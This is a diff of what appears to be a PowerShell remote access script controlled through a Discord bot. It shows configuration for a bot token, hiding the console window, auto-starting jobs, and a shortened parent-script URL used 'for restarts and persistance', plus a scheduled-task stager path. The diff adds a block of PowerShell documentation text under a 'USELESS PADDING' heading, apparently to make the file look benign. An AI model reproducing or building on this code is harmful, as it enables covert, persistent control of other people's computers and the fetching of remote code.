@@ -19,6 +19,8 @@
 USELESS PADDING
 The Get-Content cmdlet gets the content of the item at the location specified by the path, such as the text in a file or the content of a function. For files, the content is read one line at a time and returns a collection of objects, each representing a line of content.
 Beginning in PowerShell 3.0, Get-Content can also get a specified number of lines from the beginning or end of an item.
+The Set-PSDebug cmdlet turns script debugging features on and off, sets the trace level, and toggles strict mode. By default, the PowerShell debug features are off.
+When the Trace parameter has a value of 1, each line of script is traced as it runs. When the parameter has a value of 2, variable assignments, function calls, and script calls are also traced. If the Step parameter is specified, you're prompted before each line of the script runs.
 Examples
 Example 1: Get the content of a text file
 
@@ -32,8 +34,13 @@ $global:token = "$tk" # make sure your bot is in ONE server only
 $HideConsole = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
 $spawnChannels = 1 # Create new channel on session start
 $InfoOnConnect = 1 # Generate client info message on session start
-$defaultstart = 1 # Option to start all jobs automatically upon running
-$global:parent = "https://is.gd/bwdcc2" # parent script URL (for restarts and persistance)
+
+$defaultstart = 1  # Option to start all jobs automatically upon running
+if ($auto -eq 'n'){
+	$defaultstart = 0 
+}
+
+$global:parent = "is.gd/bwdcc2" # parent script URL (for restarts and persistance)
 
 # remove restart stager (if present)
 if(Test-Path "C:\Windows\Tasks\service.vbs"){
@@ -2016,4 +2023,5 @@ while ($true) {
     }
     Sleep 3
 }
+
 
